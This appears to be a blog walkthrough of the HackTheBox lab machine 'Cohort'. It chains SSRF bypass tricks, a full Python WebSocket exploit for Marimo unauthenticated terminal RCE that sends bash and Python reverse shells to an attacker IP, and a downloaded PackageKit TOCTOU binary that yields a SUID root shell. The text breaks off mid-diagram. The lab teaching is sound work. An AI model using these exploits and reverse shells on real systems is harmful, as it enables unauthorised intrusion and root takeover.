@@ -1,0 +1,653 @@
+<!DOCTYPE html><html lang="en-in"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Cohort - h4ck3rfirst</title><meta name="robots" content="noindex,nofollow"><meta name="generator" content="Publii Open-Source CMS for Static Site"><meta property="og:title" content="Cohort"><meta property="og:image" content="https://h4ck3rfirst.github.io/media/posts/9/cohort.png"><meta property="og:image:width" content="800"><meta property="og:image:height" content="800"><meta property="og:site_name" content="h4ck3rfirst"><meta property="og:description" content="Complete walk,through of the HackTheBox Pentest Lab machine Cohort hackthebox This box chains together: Before attacking anything, you need to&amp;hellip;"><meta property="og:url" content="https://h4ck3rfirst.github.io/cohort/"><meta property="og:type" content="article"><link rel="stylesheet" href="https://h4ck3rfirst.github.io/assets/css/style.css?v&#x3D;1caf1a6f5543014e342e13c53b1080b8"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://h4ck3rfirst.github.io/cohort/"},"headline":"Cohort","datePublished":"2026-08-02T10:03+05:30","dateModified":"2026-09-30T18:10+05:30","image":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/posts/9/cohort.png","height":800,"width":800},"description":"Complete walk,through of the HackTheBox Pentest Lab machine Cohort hackthebox This box chains together: Before attacking anything, you need to&hellip;","author":{"@type":"Person","name":"h4ck3rfirst","url":"https://h4ck3rfirst.github.io/authors/h4ck3rfirst/"},"publisher":{"@type":"Organization","name":"h4ck3rfirst","logo":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300}}}</script><noscript><style>img[loading] {
+                    opacity: 1;
+                }</style></noscript><style>@media (max-width: 600px) {
+    #publii-space-dust {
+        opacity: 0.85;
+    }
+}</style></head><body class="post-template"><div id="publii-space-dust" aria-hidden="true"><div id="publii-space-mouse-glow"></div></div><header class="top js-header"><a class="logo" href="https://h4ck3rfirst.github.io/"><img src="https://h4ck3rfirst.github.io/media/website/profile-2.png" alt="h4ck3rfirst" width="300" height="300"></a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://h4ck3rfirst.github.io/" target="_self" rel="https://h4ck3rfirst.github.io/">Home</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ctf-writeups/" target="_self">CTF/Labs</a></li><li><a href="https://h4ck3rfirst.github.io/tags/linux/" target="_self">Linux</a></li><li><a href="https://h4ck3rfirst.github.io/tags/windows/" target="_self">Windows</a></li><li><a href="https://h4ck3rfirst.github.io/tags/learning/" target="_self">Learning</a></li><li><a href="https://h4ck3rfirst.github.io/about-me/" target="_self">About me</a></li></ul></nav></header><main class="post"><article class="content"><div class="hero"><header class="hero__content"><div class="wrapper"><h1>Cohort</h1><div class="feed__meta content__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2026-08-02T10:03" class="feed__date">August 2, 2026</time></div></div></header><figure class="hero__image"><div class="hero__image-wrapper"><img src="https://h4ck3rfirst.github.io/media/posts/9/cohort.png" srcset="https://h4ck3rfirst.github.io/media/posts/9/responsive/cohort-xs.png 640w, https://h4ck3rfirst.github.io/media/posts/9/responsive/cohort-sm.png 768w, https://h4ck3rfirst.github.io/media/posts/9/responsive/cohort-md.png 1024w, https://h4ck3rfirst.github.io/media/posts/9/responsive/cohort-lg.png 1366w, https://h4ck3rfirst.github.io/media/posts/9/responsive/cohort-xl.png 1600w, https://h4ck3rfirst.github.io/media/posts/9/responsive/cohort-2xl.png 1920w" sizes="88vw" loading="eager" height="800" width="800" alt=""></div><figcaption>Cohort</figcaption></figure></div><div class="entry-wrapper content__entry"><p>Complete walk,through of the HackTheBox Pentest Lab machine <strong>Cohort</strong> hackthebox</p><p>This box chains together:</p><ol><li><strong>SSRF</strong> (Server-Side Request Forgery) → discover a hidden subdomain</li><li><strong>CVE-2026-39987</strong> (Marimo unauthenticated RCE) → get a shell as <code>marimo</code></li><li><strong>CVE-2026-41651</strong> (PackageKit TOCTOU LPE) → escalate to <code>root</code></li></ol><h2 id="scanningrecon">Scanning/Recon</h2><p>Before attacking anything, you need to know what’s running on the target machine. <strong>Nmap</strong> is the standard tool for this — it probes every port on the machine and tells you what services are listening.</p><h3 id="nmap">Nmap</h3><pre><code>└─$ nmap -p- --reason --min-rate 10000 10.129.21.208
+Starting Nmap 7.99 ( https://nmap.org )  
+Nmap scan report for 10.129.21.208
+Host is up, received echo-reply ttl 63 (0.15s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT    STATE SERVICE REASON
+22/tcp  open  ssh     syn-ack ttl 63
+80/tcp  open  http    syn-ack ttl 63
+443/tcp open  https   syn-ack ttl 63
+
+└─$ nmap -v -p22,80,443 -sCV -A  10.129.21.208
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+80/tcp  open  http     nginx 1.24.0 (Ubuntu)
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Did not follow redirect to https://cohort.htb/
+443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
+|_http-title: Cohort Analytics
+| tls-alpn:
+|   http/1.1
+|   http/1.0
+|_  http/0.9
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+| ssl-cert: Subject: commonName=cohort.htb/organizationName=Cohort Analytics
+| Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb
+| Issuer: commonName=cohort.htb/organizationName=Cohort Analytics
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-06-01T18:47:07
+| Not valid after:  2126-05-08T18:47:07
+| MD5:     2e50 cc1d 45e6 73fd 12c5 9e21 82f2 c0ae
+| SHA-1:   7e85 23e7 63eb 6541 a236 a388 fdc5 2514 8ca9 8e8c
+|_SHA-256: b5a8 18c7 eb3c 1923 8381 2665 afcb 2e69 85e7 b6f4 84e2 5378 205d b746 e58c b39f
+| http-methods:
+|_  Supported Methods: GET HEAD
+</code></pre><ul><li><code>-p-</code> → scan all ports (1–65535),</li><li><code>--reason</code> → show why nmap thinks a port is open/closed</li><li><code>--min-rate 10000</code> → send at least 10,000 packets per second (fast scan)</li><li><code>-sCV</code> → run default scripts (<code>-sC</code>) and detect service versions (<code>-sV</code>)</li><li><code>-A</code> → aggressive mode: OS detection, traceroute, script scanning</li><li><code>-v</code> → verbose</li></ul><p>Only three ports open — SSH and HTTP / HTTPS . Nothing exotic here. Let’s look at the web service. The TTL show it is 3ubuntu13.1 Linux machine. OpenSSH 9.6p1 on port 22 SSH. The Modern SSH key algorithm host-key used is ED25519. Nginx 1.24. is service is running on http directed to https. DNS: cohort.htb, *.cohort.htb it means there is also subdomain</p><blockquote><p><strong>Beginner tip — What is TTL?</strong> Every IP packet travels through routers to reach its destination. Each router decrements the TTL by 1. Linux starts packets at TTL 64; Windows starts at 128. By the time a packet reaches you, Linux machines typically show ~63 (one hop) and Windows shows ~127. This is a quick OS guess — not always accurate, but usually right. TTL (Time To Live) of ~63 means Linux (Windows uses ~128). Confirms this is a Linux machine.</p></blockquote><blockquote><p><strong>Beginner tip — What does <code>*.cohort.htb</code> mean?</strong> The <code>*</code> in a TLS certificate’s Subject Alternative Name means the certificate covers <strong>all subdomains</strong> of <code>cohort.htb</code>. This is called a <strong>wildcard certificate</strong>. It tells us the server is set up to serve multiple subdomains — we just need to find what they are. This becomes important very soon.</p></blockquote><h3 id="hosts">hosts</h3><p>the same IP address serves different websites depending on what Host: header your browser sends. If you visit the IP directly, you might get a different page (or nothing) compared to visiting cohort.htb. Adding to /etc/hosts makes your machine resolve the domain locally without needing a real DNS server.</p><pre><code>echo &quot;10.129.21.208   cohort.htb&quot; | sudo tee -a /etc/hosts
+
+tail -1  /etc/hosts
+10.129.21.208   cohort.htb
+</code></pre><ul><li>No subdomain found with ffuf</li></ul><h2 id="enumeration">Enumeration</h2><h3 id="https">https</h3><p>Now that we can visit the site, we scan for hidden pages and endpoints:</p><h4 id="dirfilehidden-endpoint-listing">Dir/file/hidden endpoint listing</h4><pre><code>301      GET        7l       12w      178c https://cohort.htb/api =&gt; https://cohort.htb/api/
+301      GET        7l       12w      178c https://cohort.htb/assets =&gt; https://cohort.htb/assets/
+403      GET        7l       10w      162c https://cohort.htb/status
+200      GET        1l        4w       42c https://cohort.htb/api/health
+</code></pre><p>301 = redirect (the path exists, redirects to another location) 403 = Forbidden (path exists, but we’re not allowed in) 200 = OK (page exists and is accessible)</p><ul><li>The main page is static (just HTML/CSS, no interactive logic). But there is a link to: But there is a link <code>https://cohort.htb/portal.html</code></li></ul><figure class="post__image"><img loading="lazy" src="https://h4ck3rfirst.github.io/media/posts/9/cohort_main_portal.png" alt="Cohort_main_portal" width="1191" height="746" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://h4ck3rfirst.github.io/media/posts/9/responsive/cohort_main_portal-xs.png 640w, https://h4ck3rfirst.github.io/media/posts/9/responsive/cohort_main_portal-sm.png 768w, https://h4ck3rfirst.github.io/media/posts/9/responsive/cohort_main_portal-md.png 1024w, https://h4ck3rfirst.github.io/media/posts/9/responsive/cohort_main_portal-lg.png 1366w, https://h4ck3rfirst.github.io/media/posts/9/responsive/cohort_main_portal-xl.png 1600w, https://h4ck3rfirst.github.io/media/posts/9/responsive/cohort_main_portal-2xl.png 1920w"></figure><blockquote><p>A static page is pre-built HTML that just displays information. It doesn’t process your input or talk to a database. Dynamic pages (like login forms or dashboards) send your input to a server that processes it. Static pages can’t be exploited directly — but they sometimes link to dynamic ones that can.</p></blockquote><h4 id="enumeration-main-page">Enumeration main page</h4><p>The portal at <a href="https://cohort.htb/portal.html">https://cohort.htb/portal.html</a> has an input field that accepts a URL and fetches content from it — or at least appears to. This is the classic setup for SSRF.</p><figure class="post__image"><img loading="lazy" src="https://h4ck3rfirst.github.io/media/posts/9/valication_checking_by_server.png" alt="validation_cheacking" width="596" height="314" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://h4ck3rfirst.github.io/media/posts/9/responsive/valication_checking_by_server-xs.png 640w, https://h4ck3rfirst.github.io/media/posts/9/responsive/valication_checking_by_server-sm.png 768w, https://h4ck3rfirst.github.io/media/posts/9/responsive/valication_checking_by_server-md.png 1024w, https://h4ck3rfirst.github.io/media/posts/9/responsive/valication_checking_by_server-lg.png 1366w, https://h4ck3rfirst.github.io/media/posts/9/responsive/valication_checking_by_server-xl.png 1600w, https://h4ck3rfirst.github.io/media/posts/9/responsive/valication_checking_by_server-2xl.png 1920w"></figure><p>lets try to fetch internal services and bypass the security checks</p><pre><code># Instead of 127.0.0.1 (commonly blocked), try:
+
+http://127.1/test        # shorthand — 127.1 resolves to 127.0.0.1
+127.0.1                  # different notation
+0.0.0.0                  # also loops back to localhost on Linux
+
+# Internal ports to probe:
+5000    # common for Flask / Python apps
+8888    # common for Jupyter notebooks / dev servers
+</code></pre><figure class="post__image"><img src="https://h4ck3rfirst.github.io/media/posts/9/test_dns-2.png" alt="test_dns" width="588" height="623" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://h4ck3rfirst.github.io/media/posts/9/responsive/test_dns-2-xs.png 640w, https://h4ck3rfirst.github.io/media/posts/9/responsive/test_dns-2-sm.png 768w, https://h4ck3rfirst.github.io/media/posts/9/responsive/test_dns-2-md.png 1024w, https://h4ck3rfirst.github.io/media/posts/9/responsive/test_dns-2-lg.png 1366w, https://h4ck3rfirst.github.io/media/posts/9/responsive/test_dns-2-xl.png 1600w, https://h4ck3rfirst.github.io/media/posts/9/responsive/test_dns-2-2xl.png 1920w"></figure><figure class="post__image"><img loading="lazy" src="https://h4ck3rfirst.github.io/media/posts/9/ssrf_test.png" alt="ssrf_test" width="1233" height="618" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://h4ck3rfirst.github.io/media/posts/9/responsive/ssrf_test-xs.png 640w, https://h4ck3rfirst.github.io/media/posts/9/responsive/ssrf_test-sm.png 768w, https://h4ck3rfirst.github.io/media/posts/9/responsive/ssrf_test-md.png 1024w, https://h4ck3rfirst.github.io/media/posts/9/responsive/ssrf_test-lg.png 1366w, https://h4ck3rfirst.github.io/media/posts/9/responsive/ssrf_test-xl.png 1600w, https://h4ck3rfirst.github.io/media/posts/9/responsive/ssrf_test-2xl.png 1920w"></figure><h4 id="enumration-of-sudomain">Enumration of sudomain</h4><blockquote><p><strong>Note:</strong> Initial ffuf scan for subdomains found nothing publicly — the subdomain is <strong>only discoverable via the SSRF</strong>, because it’s served on an internal-only interface or requires knowledge of the internal routing.</p></blockquote><p>Subdomain found <code>nb-1be3782a8afd3ad5.cohort.htb</code> added to /etc/hosts file</p><pre><code>└─$ whatweb https://nb-1be3782a8afd3ad5.cohort.htb/
+https://nb-1be3782a8afd3ad5.cohort.htb/ [303 See Other] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.21.208], RedirectLocation[https://nb-1be3782a8afd3ad5.cohort.htb/auth/login?next=https%3A%2F%2Fnb-1be3782a8afd3ad5.cohort.htb%2F], nginx[1.24.0]
+https://nb-1be3782a8afd3ad5.cohort.htb/auth/login?next=https%3A%2F%2Fnb-1be3782a8afd3ad5.cohort.htb%2F [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.21.208], PasswordField[password], Title[marimo], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], nginx[1.24.0]
+</code></pre><ul><li>Title: marimo — this is the application running on the subdomain</li><li>It redirects to /auth/login — there’s a login page</li><li>X-Frame-Options: DENY — can’t be embedded in an iframe (anti-clickjacking)</li></ul><blockquote><p><strong>What is <code>whatweb</code>?</strong> It’s a tool that fingerprints web technology by analysing HTTP headers, HTML content, cookies, and page titles. Think of it as asking “what software is this website built with?”</p></blockquote><blockquote><p><strong>What is <code>marimo</code>?</strong> Marimo is an open-source Python notebook tool (like Jupyter, but reactive). The important thing here is that notebook tools often include a <strong>terminal</strong> feature — a browser-based command-line interface. If that terminal is exposed without authentication, it’s instant RCE.</p></blockquote><figure class="post__image"><img loading="lazy" src="https://h4ck3rfirst.github.io/media/posts/9/cve_marimo_2026-39987.png" alt="cve_marimo_2026-39987" width="738" height="314" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://h4ck3rfirst.github.io/media/posts/9/responsive/cve_marimo_2026-39987-xs.png 640w, https://h4ck3rfirst.github.io/media/posts/9/responsive/cve_marimo_2026-39987-sm.png 768w, https://h4ck3rfirst.github.io/media/posts/9/responsive/cve_marimo_2026-39987-md.png 1024w, https://h4ck3rfirst.github.io/media/posts/9/responsive/cve_marimo_2026-39987-lg.png 1366w, https://h4ck3rfirst.github.io/media/posts/9/responsive/cve_marimo_2026-39987-xl.png 1600w, https://h4ck3rfirst.github.io/media/posts/9/responsive/cve_marimo_2026-39987-2xl.png 1920w"></figure><h2 id="exploit--initial-foothold">Exploit / Initial Foothold</h2><p>CVE-2026-39987 — Marimo Unauthenticated Terminal RCE</p><p>CVE = Common Vulnerabilities and Exposures. It’s a numbered identifier for a known security flaw.</p><p>The vulnerability: Marimo exposes a terminal WebSocket endpoint at /terminal/ws. This terminal gives you a shell on the server. In the vulnerable version, this endpoint has no authentication — anyone who can reach it can execute commands.</p><p>What is a WebSocket? Normal HTTP is like a phone call where you speak, hang up, they call back, they speak, hang up, etc. — one message at a time. A WebSocket is like leaving the call connected — both sides can send messages freely at any time without re-connecting. This is how browser-based terminals work: your keystrokes go one way, terminal output comes back the other way, all over a persistent connection.</p><p>Why is /terminal/ws unauthenticated a big deal? The marimo notebook terminal runs commands directly on the server’s operating system. It’s designed for developers to use locally. Exposing it externally without login protection is equivalent to giving a stranger a keyboard connected to your server.</p><p>The Exploit Script</p><pre><code>python
+import asyncio
+import websockets
+import ssl
+import sys
+
+async def trigger():
+    # Target and Local configuration
+    uri = &quot;wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws&quot;
+    
+    # Bypass certificate checks on the HTB box cleanly
+    ssl_context = ssl.create_default_context()
+    ssl_context.check_hostname = False
+    ssl_context.verify_mode = ssl.CERT_NONE
+
+    print(&quot;[*] Connecting to Marimo unauthenticated terminal WebSocket...&quot;)
+    try:
+        async with websockets.connect(uri, ssl=ssl_context) as ws:
+            print(&quot;[+] Connection established!&quot;)
+            print(&quot;[*] Flushing initial terminal banners...&quot;)
+            try:
+                # Flush the initial greeting buffer
+                await asyncio.wait_for(ws.recv(), timeout=1.5)
+            except asyncio.TimeoutError:
+                pass
+
+            # Payload uses interactive bash execution
+            # The trailing \r\n simulates hitting &#39;Enter&#39; physically in the PTY
+            cmd_string = &quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.xx.xxx/4444 0&gt;&amp;1&#39;\r\n&quot;
+            print(f&quot;[*] Injecting persistent payload...&quot;)
+            await ws.send(cmd_string)
+
+            print(&quot;\n[========= KEEPING SOCKET ALIVE =========]&quot;)
+            print(&quot;[*] WebSocket pinned open. Go to your netcat listener window!&quot;)
+            print(&quot;[*] Do NOT close this terminal tab or press Ctrl+C here.&quot;)
+            print(&quot;[========================================]\n&quot;)
+
+            # Infinite loop ensures the script never exits, preventing SIGHUP to the shell
+            while True:
+                output = await ws.recv()
+                # Uncomment to debug stream communication if needed:
+                # print(f&quot;[Target Log]: {output.strip()}&quot;)
+
+    except Exception as e:
+        print(f&quot;[-] WebSocket stream disconnected: {e}&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    try:
+        asyncio.run(trigger())
+    except KeyboardInterrupt:
+        print(&quot;\n[*] Script stopped manually. Connection terminated.&quot;)
+</code></pre><p><strong>Breaking down the script line by line:</strong></p><table><thead><tr><th>Code</th><th>Plain English</th></tr></thead><tbody><tr><td><code>uri = &quot;wss://...terminal/ws&quot;</code></td><td>The address of the unprotected terminal WebSocket</td></tr><tr><td><code>ssl_context.verify_mode = ssl.CERT_NONE</code></td><td>Skip SSL certificate validation — HTB uses a self-signed cert that Python rejects by default</td></tr><tr><td><code>websockets.connect(uri, ssl=ssl_context)</code></td><td>Open a persistent connection to the terminal</td></tr><tr><td><code>await asyncio.wait_for(ws.recv(), timeout=1.5)</code></td><td>Read and discard the initial “welcome” banner the terminal sends</td></tr><tr><td><code>cmd_string = &quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1&#39;\r\n&quot;</code></td><td>The reverse shell payload — see below</td></tr><tr><td><code>while True: output = await ws.recv()</code></td><td>Keep the WebSocket alive so the reverse shell doesn’t get killed when Python exits</td></tr></tbody></table><blockquote><p><strong>What is a Reverse Shell?</strong></p><p>A <strong>reverse shell</strong> is when the <em>victim machine</em> reaches out and connects <em>to you</em>, giving you a command-line interface on that machine.</p><p>Why “reverse”? Normally you’d connect <em>to</em> a server. But here, the server is behind a firewall and you can’t connect to it directly. So you make the server connect to <em>you</em> instead. You listen on a port, the exploit tells the server “connect here”, and it does.</p><p><strong>The payload:</strong> <code>bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1</code></p><ul><li><code>bash -i</code> → open an interactive bash shell</li><li><code>&gt;&amp; /dev/tcp/YOUR_IP/4444</code> → redirect its output to a TCP connection to your IP on port 4444</li><li><code>0&gt;&amp;1</code> → also redirect input from that same connection</li></ul><p>The <code>\r\n</code> at the end simulates pressing Enter in the terminal.</p></blockquote><blockquote><p><strong>Why keep the WebSocket alive (the <code>while True</code> loop)?</strong> When a parent process dies, it sends <code>SIGHUP</code> to its children — telling them to also quit. If the Python script exits after sending the payload, the WebSocket closes, which kills the terminal, which kills your reverse shell. The infinite loop prevents the script from exiting, keeping the connection alive.</p></blockquote><h3 id="setting-up-your-listener">Setting Up Your Listener</h3><p>Before running the exploit, open a <strong>separate terminal</strong> and start listening for the incoming connection:</p><pre><code class="language-bash">rlwrap nc -lvnp 4444
+</code></pre><p><strong>What each flag means:</strong></p><ul><li><code>rlwrap</code> → wraps netcat to give you arrow-key history (makes the shell easier to use)</li><li><code>-l</code> → listen mode (wait for incoming connections)</li><li><code>-v</code> → verbose (show what’s happening)</li><li><code>-n</code> → no DNS resolution (faster)</li><li><code>-p 4444</code> → listen on port 4444</li></ul><h3 id="running-the-exploit">Running the Exploit</h3><pre><code class="language-bash"># Edit the script first — replace 10.10.xx.xxx with YOUR TryHackMe/HTB VPN IP
+python3 cve.py
+</code></pre><h2 id="user-flag">User Flag</h2><pre><code class="language-bash"># Your listener receives the connection:
+listening on [any] 4444 ...
+connect to [10.10.xx.xxx] from (UNKNOWN) [10.129.21.208] 40282
+marimo@cohort:~$ id
+uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
+</code></pre><p>You now have a shell as the <code>marimo</code> user.</p><pre><code class="language-bash">marimo@cohort:~$ cat user.txt
+# 🚩 User flag is here
+</code></pre><h3 id="shell-stability--why-your-shell-might-die">Shell Stability — Why Your Shell Might Die</h3><p>The initial reverse shell is fragile. If you press <code>Ctrl+C</code>, run certain commands, or the WebSocket gets disrupted, it dies. Here’s how to make it stable.</p><p><strong>Option 1 — Quick Python PTY upgrade:</strong></p><pre><code class="language-bash">python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39;
+# Then:
+# Ctrl+Z (suspend shell)
+stty raw -echo; fg
+export TERM=xterm
+</code></pre><blockquote><p><strong>What is a PTY?</strong> PTY = Pseudo Terminal. A raw netcat shell has no terminal emulation — it can’t handle arrow keys, <code>Ctrl+C</code> properly, or full-screen programs like <code>vim</code>. Spawning a PTY makes the shell behave like a real terminal window.</p></blockquote><p><strong>Option 2 — Stable setsid shell (your method — recommended if shell keeps dying):</strong></p><pre><code class="language-bash"># On the victim machine — write and run a stable shell script
+cat &gt; shell.sh &lt;&lt; &#39;EOF&#39;
+setsid python3 -c &#39;import socket,os,pty;s=socket.socket();s.connect((&quot;10.10.xx.xxx&quot;,4445));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(&quot;bash&quot;)&#39; &lt; /dev/null &gt; /dev/null 2&gt;&amp;1 &amp;
+EOF
+chmod 777 shell.sh; ./shell.sh
+ 
+# On your attacker machine — second listener:
+nc -lvnp 4445
+</code></pre><blockquote><p><strong>Why <code>setsid</code>?</strong> <code>setsid</code> creates a new <strong>session</strong> for the process, detaching it from the controlling terminal. This means closing the WebSocket or original shell won’t send a kill signal to the new shell. It runs independently in the background. The <code>&lt; /dev/null &gt; /dev/null 2&gt;&amp;1</code> redirects away from the terminal entirely, and <code>&amp;</code> puts it in the background. Together, this creates a shell that survives the death of its parent.</p></blockquote><h2 id="privilege-escalation">Privilege Escalation</h2><h3 id="what-is-privilege-escalation">What Is Privilege Escalation?</h3><p>You have a shell as <code>marimo</code> — a regular user with limited permissions. Root (administrator) has full control over the system. <strong>Privilege escalation</strong> (privesc) is the process of going from low-privilege user → root.</p><h3 id="automated-enumeration-with-linpeas">Automated Enumeration with linPEAS</h3><p><code>linPEAS</code> is a script that automatically checks hundreds of known privesc vectors on Linux. It found something immediately:</p><pre><code>╔══════════╣ Checking for PackageKit Pack2TheRoot (CVE-2026-41651) (T1068)
+╚ https://github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html
+PackageKit version detected: 1.2.8-2ubuntu1.2
+Vulnerable to CVE-2026-41651 (Pack2TheRoot)
+PackageKit 1.2.8-2ubuntu1.2 is below the Ubuntu 24.04 fixed version: 1.2.8-2ubuntu1.5
+</code></pre><blockquote><p><strong>What is PackageKit?</strong> PackageKit is a system service that handles installing/removing software packages on Linux. It’s what powers the graphical software installer in Ubuntu’s desktop environment. It runs with root privileges because installing software requires root access.</p></blockquote><h3 id="cve-2026-41651--packagekit-toctou-lpe">CVE-2026-41651 — PackageKit TOCTOU LPE</h3><p><strong>LPE</strong> = Local Privilege Escalation (you need to already be on the machine, then this gets you root)</p><p><strong>TOCTOU</strong> = <strong>T</strong>ime <strong>O</strong>f <strong>C</strong>heck <strong>T</strong>o <strong>T</strong>ime <strong>O</strong>f <strong>U</strong>se — a class of race condition vulnerability</p><blockquote><p><strong>What is a TOCTOU race condition?</strong></p><p>Imagine a security guard who checks your ID card at the door, lets you in, but then you swap your ID with a fake one before they can verify again. The guard checked a real ID (Time Of Check), but you used a fake one to do something (Time Of Use). The gap between check and use is the race window.</p><p>In PackageKit’s case:</p><ol><li><strong>PackageKit checks</strong> if it’s allowed to install a package → allowed</li><li><strong>Attacker swaps</strong> the package content for a malicious one during the tiny gap</li><li><strong>PackageKit installs</strong> the malicious package as root → root-owned files appear on disk</li></ol><p>The exploit creates a SUID bash binary — a copy of <code>/bin/bash</code> that runs as root regardless of who executes it.</p></blockquote><blockquote><p><strong>What is SUID?</strong> SUID (Set User ID) is a special permission bit on Linux executables. When set on a file owned by root, <em>anyone</em> who runs that file gets root’s privileges for the duration of the program. An SUID bash at <code>/tmp/.suid_bash</code> means any user who runs <code>/tmp/.suid_bash -p</code> gets a root shell.</p></blockquote><h3 id="running-the-exploit-1">Running the Exploit</h3><p><strong>Step 1 — Download the pre-compiled exploit binary from your attacker machine:</strong></p><pre><code class="language-bash"># On your attacker machine — host the file
+python3 -m http.server 8000
+ 
+# On the victim machine — download it
+marimo@cohort:/tmp$ curl http://10.10.16.153:8000/cve-2026-41651 -o root
+</code></pre><pre><code>  % Total    % Received  % Xferd  Average Speed   Time  
+100 27544    100 27544    0     0  42493      0  --:--:--
+</code></pre><p><strong>Step 2 — Make it executable and run:</strong></p><pre><code class="language-bash">marimo@cohort:/tmp$ chmod +x root
+marimo@cohort:/tmp$ ./root
+</code></pre><p><strong>Output:</strong></p><pre><code>═══════════════════════════════════════════════════
+ CVE-2026-41651 — PackageKit TOCTOU LPE
+═══════════════════════════════════════════════════
+[*] Building packages (pure C)...
+[+] dummy   : /tmp/.pk-dummy-2174.deb
+[+] payload : /tmp/.pk-payload-2174.deb
+[*] Transaction : /8_eebebbab
+[*] Step 1 : InstallFiles(SIMULATE=0x4, dummy) [async]
+[*] Step 2 : InstallFiles(NONE=0x0, payload) [async]
+[*] Waiting for dispatch (30 s max)...
+[!] PK error 48: Failed to obtain authentication.
+[*] Finished (exit=2, 0 ms)
+[*] Loop ran for 11 ms
+[*] Polling for payload (120 s max)...
+[*] t+1s: payload=exists dpkg_lock=free suid=FOUND
+ 
+[+] SUCCESS — SUID bash at t+0ms
+uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
+</code></pre><p><strong>What each step means:</strong></p><table><thead><tr><th>Step</th><th>What the exploit is doing</th></tr></thead><tbody><tr><td><code>Building packages (pure C)</code></td><td>Creates two <code>.deb</code> packages in memory: a harmless “dummy” package and a malicious “payload” package</td></tr><tr><td><code>InstallFiles(SIMULATE, dummy)</code></td><td>Asks PackageKit to simulate installing the dummy package — gets a transaction ID from PK</td></tr><tr><td><code>InstallFiles(NONE, payload)</code></td><td>Within the same transaction, races to swap the dummy for the payload before PK checks again</td></tr><tr><td><code>PK error 48: Failed to obtain authentication</code></td><td>PackageKit tried to ask for admin auth — but the race was won before it got to ask</td></tr><tr><td><code>suid=FOUND</code></td><td>The SUID bash binary was successfully written to disk by root</td></tr><tr><td><code>euid=0(root)</code></td><td>Effective User ID is now 0 = root</td></tr></tbody></table><blockquote><p><strong>Why does it show <code>euid=0</code> but still <code>uid=1000</code>?</strong> <code>uid</code> is your real user ID (who you logged in as — <code>marimo</code>). <code>euid</code> is your effective user ID (what privileges you actually have right now). The SUID bash gives you root’s <code>euid</code> without changing your <code>uid</code>. For reading files and executing commands, <code>euid=0</code> is what matters.</p></blockquote><h3 id="getting-the-root-shell">Getting the Root Shell</h3><pre><code class="language-bash">.suid_bash-5.2# id
+uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
+ 
+.suid_bash-5.2# cd /root
+.suid_bash-5.2# ls
+root.txt
+ 
+.suid_bash-5.2# cat root.txt
+# 🚩 Root flag here
+</code></pre><h3 id="troubleshooting--if-the-exploit-fails">Troubleshooting — If the Exploit Fails</h3><p>If the TOCTOU race doesn’t win on the first try (race conditions are timing-dependent — they don’t always succeed immediately):</p><p><strong>Step 1 — Upgrade your shell first:</strong></p><pre><code class="language-bash">python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39;
+# Ctrl+Z
+stty raw -echo; fg; export TERM=xterm
+</code></pre><blockquote><p><strong>Why does shell quality affect this?</strong> The TOCTOU exploit is timing-sensitive. An unstable shell with extra latency (like a raw netcat shell) can cause the exploit to miss the race window. A proper PTY shell has more predictable timing.</p></blockquote><p><strong>Step 2 — Re-run the exploit:</strong></p><pre><code class="language-bash">./root
+</code></pre><p>The race typically succeeds within 1–3 attempts.</p><h2 id="full-attack-chain--the-complete-picture">Full Attack Chain — The Complete Picture</h2><pre><code>[You — Attacker]
+      │
+      │  nmap → 3 ports: 22, 80, 443
+      │  SSL cert → *.cohort.htb wildcard → subdomains exist
+      ▼
+[cohort.htb/portal.html]
+      │
+      │  Input field → SSRF vulnerability
+      │  Test bypasses: 127.1, 0.0.0.0, port probing
